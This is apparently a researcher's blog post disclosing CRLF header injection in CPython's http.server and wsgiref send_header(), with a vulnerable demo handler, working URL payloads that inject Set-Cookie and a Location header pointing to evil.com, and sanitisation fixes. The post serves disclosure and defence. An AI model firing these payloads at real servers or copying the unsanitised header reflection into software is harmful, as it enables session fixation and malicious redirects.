---
layout: post
title: "CRLF Injection in CPython's http.server and wsgiref"
date: 2026-04-24
author: Yunus Aydın
lang: en
description: "CRLF injection vulnerability in CPython's http.server and wsgiref send_header() allows injecting arbitrary HTTP headers including Set-Cookie and Location when user input is reflected in headers."
keywords: "CRLF injection, CPython, http.server, wsgiref, header injection, session fixation, open redirect, Python security, BaseHTTPRequestHandler, send_header"
canonical_url: "https://aydinnyunus.github.io/2026/04/24/crlf-injection-cpython-http-server-wsgiref/"
---

I found a **CRLF injection vulnerability** in CPython's standard library — specifically in `http.server` and `wsgiref`. When an application reflects user-controlled input into HTTP headers via `send_header()`, an attacker can inject arbitrary new headers. The CPython team updated the documentation with security warnings across pull requests [#142605](https://github.com/python/cpython/pull/142605), [#143395](https://github.com/python/cpython/pull/143395), [#148020](https://github.com/python/cpython/pull/148020), and [#148021](https://github.com/python/cpython/pull/148021).

## Here's the vulnerable code

`send_header()` in `Lib/http/server.py` constructs and appends header values directly to the output buffer. No validation:

```python
def send_header(self, keyword, value):
    """Send a MIME header to the headers buffer."""
    if self.request_version != 'HTTP/0.9':
        if not hasattr(self, '_headers_buffer'):
            self._headers_buffer = []
        self._headers_buffer.append(
            ("%s: %s\r\n" % (keyword, value)).encode('latin-1', 'strict'))
    # No check for \r or \n in value
```

The format string ends with `\r\n`, which terminates the header line. If `value` itself contains `\r\n`, the header ends early — and everything after becomes a new, unvalidated header. That's the injection point.

## Scenario 1: Set-Cookie injection

A minimal application reflects a query parameter into a custom header:

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlparse

class VulnerableHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)
        custom_val = query.get('val', [''])[0]
        
        self.send_response(200)
        self.send_header('X-Custom', custom_val)
        self.end_headers()
        self.wfile.write(b"Hello World")
```

Normal request: `http://localhost:8000/?val=hello` produces `X-Custom: hello`.

Attack:

```
http://localhost:8000/?val=test%0d%0aSet-Cookie:%20pwned=true
```

Server response:

```http
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.x
Date: ...
X-Custom: test
Set-Cookie: pwned=true
```

The `%0d%0a` is URL-encoded `\r\n`. The server split the header at that point. The attacker's `Set-Cookie` now appears as a legitimate response header. A browser receives this and sets the `pwned` cookie — no indication of tampering.

This enables **session fixation**: attacker crafts a link that sets a session cookie they control, sends it to the victim, waits for the victim to log in, then uses the pre-set session ID to hijack the authenticated session.

## Scenario 2: Location header injection

Same application, different payload:

```
http://localhost:8000/?val=test%0d%0ALocation:%20http://evil.com/
```

Response:

```http
HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.x
Date: ...
X-Custom: test
Location: http://evil.com/
```

The server returned HTTP 200 but included a `Location` header pointing to attacker infrastructure. Depending on how the response is handled downstream — proxies, caches, client libraries — this can trigger unintended redirects even though the status code says "OK."

## Other attack vectors

Beyond cookie and redirect abuse, injecting headers opens these paths:

- **Cache poisoning**: Inject `Cache-Control` or `Vary` to manipulate what gets stored and how long
- **XSS via content-type override**: Some frameworks reflect headers into HTML. Injecting `Content-Type: text/html` on a response that would otherwise be `text/plain` can enable script execution
- **Web cache deception**: Inject headers that make caches store personalized responses under public URLs
- **Response splitting**: Inject `\r\n\r\n` to terminate headers early and control the response body

## Root cause

The vulnerability exists because `send_header()` doesn't validate its input. The standard says HTTP headers must not contain line breaks; the library should enforce this.

The "fix it at the application level" argument doesn't work here. Yes, applications *should* sanitize user input. But when the standard library makes it trivial to introduce a class of vulnerabilities, that's a library design problem. A defense-in-depth approach: the library validates, and the application validates. One doesn't replace the other.

## The fix

The CPython team took a **documentation approach** rather than enforcing runtime validation. The concern: adding automatic validation would break existing code that legitimately uses CRLF for line folding or encoded values in headers.

Instead, the team added security warnings to the documentation for `send_header()` and `send_response_only()`, making clear that these methods:
- "do not reject input containing CRLF sequences"
- "assume sanitized input" from the caller

This puts the responsibility back on application developers: **you must validate or encode user input before passing it to `send_header()`**.

If you're reflecting user input, do it properly:

```python
# Bad: direct reflection
self.send_header('X-Custom', user_input)

# Good: strip/reject control characters
safe_value = user_input.replace('\r', '').replace('\n', '')
self.send_header('X-Custom', safe_value)

# Or: validate that it contains only safe characters
if '\r' in user_input or '\n' in user_input:
    return self.send_error(400, "Invalid header value")
self.send_header('X-Custom', user_input)
```

## Disclosure timeline

- **Reported to CPython**: via the security reporting process (private disclosure)
- **Documentation PRs**: #142605, #143395, #148020, #148021
- **Affected versions**: All versions with the vulnerable code (Python 3.x through 3.12+)
- **Status**: Documentation warnings added to current and LTS branches at time of publication

The CPython team handled this responsibly — they took the reports, updated the documentation in multiple modules, and made the guidance available without unnecessary delay.

## References

- [PR #142605 on CPython](https://github.com/python/cpython/pull/142605) — http.server fix
- [PR #143395 on CPython](https://github.com/python/cpython/pull/143395) — wsgiref fix
- [PR #148020 on CPython](https://github.com/python/cpython/pull/148020) — http.server (3.12+)
- [PR #148021 on CPython](https://github.com/python/cpython/pull/148021) — wsgiref (3.12+)
- [CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers](https://cwe.mitre.org/data/definitions/113.html)
- [HTTP/1.1 Specification (RFC 7230)](https://tools.ietf.org/html/rfc7230) — section 3.2

## Related content

- [SQL Injection Vulnerability in GeoPandas to_postgis()](/2025/12/27/sql-injection-geopandas/) — protocol-level injection in data processing
- [CVE-2026-0562: IDOR in LollMS friend request endpoint](/2026/04/18/idor-lollms-friend-request-cve-2026-0562/) — another injection-class vulnerability in web services
